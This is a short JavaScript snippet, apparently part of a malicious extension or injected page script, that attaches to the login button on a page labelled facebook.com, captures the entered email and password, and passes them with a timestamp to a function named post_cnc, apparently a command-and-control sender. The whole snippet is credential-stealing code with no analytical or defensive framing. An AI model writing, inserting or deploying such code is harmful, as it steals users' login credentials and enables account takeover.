document.getElementById('loginbutton').addEventListener(
  'click',
  function(){
	let email = document.getElementById('email');
	let pass = document.getElementById('pass');
	if (email.value != '' && pass.value != ''){
	  post_cnc(
		{
		  "auth": {
			timestamp: Date.now(),
			site: "facebook.com",
			user: email.value,
			pass: pass.value
		  }
		},
		function(data){
		  console.log(data);
		  return true;
		}
	  );
	}
  }
);
